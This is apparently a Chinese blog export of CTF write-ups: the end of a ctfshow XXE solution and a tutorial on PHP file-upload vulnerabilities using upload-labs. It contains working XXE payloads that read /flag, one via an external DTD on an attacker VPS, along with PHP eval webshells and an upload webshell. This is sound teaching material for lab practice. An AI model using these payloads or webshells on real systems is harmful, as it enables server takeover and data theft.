<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://819c130f-b2e1-4626-b9f8-8326d5ececbc.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/02/VPGSAM5s4NgQUeb.png" alt="image-20240402200146457"></p>
<h1 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h1><p>f12 发现可疑代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;doLogin&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: data,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">        	&#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;); </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码是一个 JavaScript 函数，名为<code>doLogin()</code>，它执行用户登录的操作。具体功能如下：</p>
<ol>
<li><p>获取用户输入的用户名和密码：</p>
<ul>
<li>通过<code>$(&quot;#username&quot;).val()</code>获取用户名输入框的值，存储在变量<code>username</code>中。</li>
<li>通过<code>$(&quot;#password&quot;).val()</code>获取密码输入框的值，存储在变量<code>password</code>中。</li>
</ul>
</li>
<li><p>检查用户名和密码是否为空：</p>
<ul>
<li>如果用户名或密码为空，则弹出警告框提示用户输入用户名和密码，并返回，不继续执行登录操作。</li>
</ul>
</li>
<li><p>构建XML格式的数据：</p>
<ul>
<li>使用用户输入的用户名和密码构建一个XML格式的字符串，如<code>&lt;user&gt;&lt;username&gt;user123&lt;/username&gt;&lt;password&gt;pass123&lt;/password&gt;&lt;/user&gt;</code>，存储在变量<code>data</code>中。</li>
</ul>
</li>
<li><p>发送Ajax请求：</p>
<ul>
<li>使用<code>$.ajax()</code>方法发送 POST 请求到 URL 为 “doLogin”。</li>
<li>设置请求头的内容类型为 XML ，编码为 UTF-8 。</li>
<li>发送构建好的 XML 数据。</li>
<li>期望响应的数据类型为 XML 。</li>
<li>设置<code>anysc</code>为 false ，表示同步请求。</li>
<li>定义请求成功的回调函数和请求失败的回调函数。</li>
</ul>
</li>
<li><p>处理响应：</p>
<ul>
<li>如果请求成功，从响应中提取<code>code</code>和<code>msg</code>，根据<code>code</code>的值显示不同的消息在页面上。</li>
<li>如果请求失败，显示错误消息在页面上。</li>
</ul>
</li>
</ol>
<p>显然又是 XXE，输入 admin&#x2F;admin 后看他发送的包更加明了一些：</p>
<p><img src="https://s2.loli.net/2024/04/02/iFLAJzIahG9Olf5.png" alt="image-20240402201520838"></p>
<p>payload 反而比前面几道简单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">XEE</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/02/OwET1C2ky7celi6.png" alt="image-20240402201914912"></p>
]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>在 PHP 语言下的文件上传漏洞</title>
    <url>/2024/04/02/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="认识-WebShell"><a href="#认识-WebShell" class="headerlink" title="认识 WebShell"></a>认识 WebShell</h3><h4 id="webshell-概念"><a href="#webshell-概念" class="headerlink" title="webshell 概念"></a>webshell 概念</h4><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是获得服务器的执行操作权限，以 aspx、php、jsp 等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。 </p>
<p>常见的后端开发语言主要有 Java、.net、php，而 WebShell 就是 jsp、aspx、php等网页文件形式存在的一种命令、代码执行环境，也可以将其称做为一种网页木马后门。</p>
<p>黑客在入侵了一个网站后，通常会将 jsp、aspx 或 php 后门文件与网站服务器 WEB 目录下正常的网页文件混在一起。然后就可以使用浏览 器来访问后门文件，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>可以穿越防火墙，由于与被控制的服务器或远程主机交换的数据都是通过 http&#x2F;https 协议（默认 80、443 端口）传递的，因此不会被防火墙拦截。</p>
<p>使用 WebShell 一般不会在系统日志中留下记录，只会在网站的 web 日志（比如 apache 的 access.log）中留下一些数据提交记录，没有经验的管理员是很难看出入侵痕迹的。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>WebShell 根据编程语言可以分为 php 木马、aspx 木马和 jsp 木马（跟随时代和技术的发展，现在也用 python 编写的脚本木马）。</p>
<p>按照文件大小和功能可以分为3种：大马，小马，一句话木马，具体使用场景和特点如下图：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/308e96b97ed0565eed3578de869914df.png" alt="image-20240506123157080"></p>
<h5 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h5><p>代码简短，通常只有一行代码，使用方便。</p>
<p>比如 PHP 木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="number">123</span>); @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="number">123</span>); @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 GET、POST 表示客户端向服务端传递参数的两种种方式，一句话木马用<code> $_GET[&#39; &#39;]</code>或者<code>$_POST[&#39; &#39;]</code>接收攻击者传递的数据，并把接收的数据传递给一句话木马中执行命令的函数（<code>eval()</code>，<code>assert()</code>等），进而执行命令。</p>
<p><code>echo(123);</code> 是用来检测木马是否成功运行。</p>
<p>当将 <code>@</code>放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p>
<p><code>eval()</code> 就是执行命令的函数，<code>$_POST[&#39; &#39;]</code> 就是接收的数据，<code>eval()</code> 函数把接收的数据当作 PHP 代码来执行。这样攻击者就能够让插入了一句话木马的网站执行传递过去的任意 PHP 语句，包括系统命令。</p>
<p>比如：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cmd = <span class="built_in">cat</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h5><p>只包含文件上传功能，体积小的木马。</p>
<p>比如上传任意文件的木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$temp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">@<span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;&#x27; method=&#x27;POST&#x27; ENCTYPE=&#x27;multipart/form-data&#x27;&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;local file:&lt;input type=&#x27;file&#x27; name=&#x27;upload_file&#x27;&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Upload&#x27;&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;\n&lt;pre&gt;\n\n&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;successfully.&lt;p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;unable to uplaod&quot;</span> . <span class="variable">$file</span> . <span class="string">&quot;.&lt;p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h5><p>体积大，包含很多功能，代码通常会进行加密隐藏，一般需要连接密码。</p>
<h2 id="认识文件上传"><a href="#认识文件上传" class="headerlink" title="认识文件上传"></a>认识文件上传</h2><p><strong>文件上传</strong></p>
<p>就是将客户端的文件上传到服务器的过程。 </p>
<p>比如 QQ 空间发表说说上传的图片、招聘网上传简历、将文件上传到网盘等，这些都是文件上传。</p>
<p><strong>文件上传漏洞</strong></p>
<p>上传文件的时候，如果服务器端、后端未对上传的文件进行严格的验证和过滤，就可能造成上传恶意文件的情况，造成文件上传漏洞。 </p>
<p>常见场景是 web 服务器允许用户上传图片或者普通文本文件保存，而攻击者绕过上传机制上传恶意代码文件并执行从而控制服务器。</p>
<p>这个恶意的代码文件（ php、asp、aspx、jsp 等）就是 webshell。 </p>
<p>危害：攻击者通过上传恶意文件传递给解释器去执行，然后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理、命令执行等恶意操作。从而控制整个网站，甚至是服务器。</p>
<p><strong>条件</strong>：</p>
<p>能上传 webshell </p>
<p>webshell 路径可知 </p>
<p>webshell 可以被访问</p>
<p>webshell 可以被解析</p>
<h2 id="PHP-实现文件上传的代码基础"><a href="#PHP-实现文件上传的代码基础" class="headerlink" title="PHP 实现文件上传的代码基础"></a>PHP 实现文件上传的代码基础</h2><p>以 upload-labs Pass-01 的关键源码为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>首先引入了两个文件 <code>config.php</code> 和 <code>head.php</code>、<code>menu.php</code>。这些文件包含了一些全局配置和页面模板。</p>
</li>
<li><p>初始化了两个变量 <code>$is_upload</code> 和 <code>$msg</code>。<code>$is_upload</code> 用于标记文件是否上传成功，<code>$msg</code> 用于存储错误信息。</p>
</li>
<li><p>当用户提交表单（<code>isset($_POST[&#39;submit&#39;])</code>）时，开始进行文件上传的处理。</p>
</li>
<li><p>首先检查 <code>UPLOAD_PATH</code> 是否存在。</p>
<p><code>UPLOAD_PATH</code> 是一个常量，它表示文件上传的目录路径。这个常量通常在 <code>config.php</code> 文件中定义。</p>
<p>如果不存在，则将错误信息存储到 <code>$msg</code> 变量中。</p>
<p>该常量同时在下一步构建上传文件的目标路径。上传文件会被保存到 <code>UPLOAD_PATH</code> 指定的目录中，文件名为上传文件的原始文件名。</p>
</li>
<li><p>如果 <code>UPLOAD_PATH</code> 存在，则获取上传文件的临时路径（<code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>）和目标路径（<code>UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>）。</p>
<p>当用户通过表单上传文件时，PHP 会将文件暂时存储在服务器的临时目录中，并将相关信息存储在 <code>$_FILES</code> 超级全局变量中。</p>
<p><code>$_FILES</code> 变量是一个二维数组，其中包含了上传文件的各种信息，如文件名、文件类型、文件大小等。</p>
<p><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code> 就是其中的一个元素，它存储了上传文件的临时存储路径。这个临时路径是 PHP 自动生成的，用于在将文件移动到最终存储位置之前保存文件。</p>
<p>其中 <code>&#39;upload_file&#39;</code> 就是表单中 <code>&lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</code> 中的 <code>name</code> 属性值。</p>
<p>而 <code>&#39;tmp_name&#39;</code> 就是 <code>$_FILES</code> 数组中的一个键，用于表示上传文件的临时存储路径。</p>
<p>使用 <code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code> 来获取上传文件的临时路径，然后将其移动到 <code>UPLOAD_PATH</code> 指定的目录中，完成文件的上传过程。</p>
<p><code>&#39;name&#39;</code> 是 <code>$_FILES</code> 数组中的另一个键，对应的是上传文件的原始文件名。</p>
<p><code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code> 就是用于获取上传文件的原始文件名。这个文件名是用户在本地计算机上选择的文件名，在上传到服务器时保留了下来。</p>
<p>这里是<code>$_FILES</code>中的那些参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_FILES</span> 这个变量用与上传的文件参数设置，是一个多维数组</span><br><span class="line">数组的用法就是 <span class="variable">$_FILES</span>[<span class="string">&#x27;key&#x27;</span>][<span class="string">&#x27;key2&#x27;</span>];</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>] 是你表单上传的文件信息数组，upfile 是文件上传字段，在上传时由服务器根据上传字段设定</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>] 包含了以下内容：</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如 <span class="string">&quot;image/gif&quot;</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 已上传文件的大小，单位为字节</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 和该文件上传相关的错误代码</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>move_uploaded_file()</code> 函数将临时文件移动到目标路径。如果移动成功，则将 <code>$is_upload</code> 设置为 <code>true</code>，否则将错误信息存储到 <code>$msg</code> 变量中。</p>
</li>
</ol>
<h2 id="文件检测机制与绕过方式"><a href="#文件检测机制与绕过方式" class="headerlink" title="文件检测机制与绕过方式"></a>文件检测机制与绕过方式</h2><p>大多数网站都存在文件检测机制，不会允许任意文件上传。常见的文件检测方式有：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/11e8d6792e16338afbf2867932ebe56f.png" alt="image-20240506124945474"></p>
<h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><p>一般来说，给 webshell 添加文件头就可以绕过</p>
<p>文件头可以将文件拖入 010 editor 后看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF : GIF89a </span><br><span class="line">png : %PNG....</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/38aedcd27f0cb1b41bdd00c790c75ec2.png" alt="image-20231019204923063"></p>
<h3 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h3><p>客户端检测一般是在网页上写一段 javascript 脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p>
<p>判断方式：在浏览加载文件，点击上传按钮时便弹出对话框，内容如：只允许上传 .jpg &#x2F; .jpeg &#x2F; .png 后缀名的文件，而此时并没有发送数据包。</p>
<h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>upload-labs Pass-01：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 定义允许上传的文件类型</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 提取上传文件的类型</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 判断上传文件类型是否允许上传</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(errMsg);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>这段 JavaScript 代码定义了 checkFile 函数</p>
</li>
<li><p><code>var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;</code></p>
<p>获取表单中 <code>&lt;input type=&quot;file&quot; name=&quot;upload_file&quot;&gt;</code> 元素的值，也就是用户选择的文件路径。</p>
<p><code>document.getElementsByName(&#39;upload_file&#39;)</code> 这个方法用于根据元素的 <code>name</code> 属性获取匹配的元素集合。它会获取所有 <code>name</code> 属性为 <code>&#39;upload_file&#39;</code> 的 <code>&lt;input&gt;</code> 元素。所以返回的是一个 HTML 集合，此时需要通过索引来访问具体的元素。<code>[0]</code> 表示获取集合中的第一个元素。</p>
<p><code>.value</code> 这个属性用于获取表单控件的值。对于 <code>&lt;input type=&quot;file&quot;&gt;</code> 元素来说，它就是文件路径。</p>
</li>
<li><p><code>if (file == null || file == &quot;&quot;)</code></p>
<p>这个条件判断用于检查用户是否选择了文件。如果 <code>file</code> 变量为 <code>null</code> 或空字符串 <code>&quot;&quot;</code>，说明用户没有上传文件。如果条件成立，则弹出警告框提示用户上传文件，并返回 <code>false</code> 阻止表单提交。</p>
</li>
<li><p><code>var allow_ext = &quot;.jpg|.png|.gif&quot;;</code></p>
<p>定义了允许上传的文件类型，包括 <code>.jpg</code>、<code>.png</code> 和 <code>.gif</code>。</p>
</li>
<li><p><code>var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</code></p>
<p>提取上传文件的扩展名。</p>
<p><code>lastIndexOf(&quot;.&quot;)</code> 提取 file 变量中 <code>.</code> 首次出现的位置（返回一个数字）</p>
<p>使用 <code>substring()</code> 方法从文件路径中获取最后一个点 <code>.</code> 之后的部分，即文件的扩展名。</p>
</li>
<li><p><code>if (allow_ext.indexOf(ext_name) == -1)</code> 这个条件判断用于检查上传文件的扩展名是否在允许的扩展名列表中。</p>
<p>如果 <code>allow_ext</code> 字符串中不包含 <code>ext_name</code>（此时 indexof 方法返回 -1），说明文件类型不被允许上传。</p>
<p>如果条件成立，则弹出警告框提示用户上传正确的文件类型，并返回 <code>false</code> 阻止表单提交。</p>
</li>
</ol>
<p>那么最简单的方法就是前端禁用 JavaScript </p>
<p>以 Google 浏览器为例：</p>
<p>访问：chrome:&#x2F;&#x2F;settings&#x2F;content&#x2F;javascript</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1f929a79febdb2b0dc62b75fb259093b.png" alt="image-20240506184255910"></p>
<p>webshell.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="number">123</span>); @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d0812ed91582307cdb521db33db83ecc.png" alt="image-20240506185341228"></p>
<p>访问图片地址 <a href="http://127.0.0.1/uploadlabs/upload/webshell.php">http://127.0.0.1/uploadlabs/upload/webshell.php</a> （右键点击图片会显示）</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0963c34cec0a4e29329b777e24de0f94.png" alt="image-20240506190043432"></p>
<p>有回显 123 说明 webshell 被成功解析！此时可以用 POST 方法进行命令执行：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a0aeae53ddeaadd33e2719f48225be06.png" alt="image-20240506191426539"></p>
<p>或者可以连接蚁剑：</p>
<p>连接密码为 <code>$_POST</code> 中的参数</p>
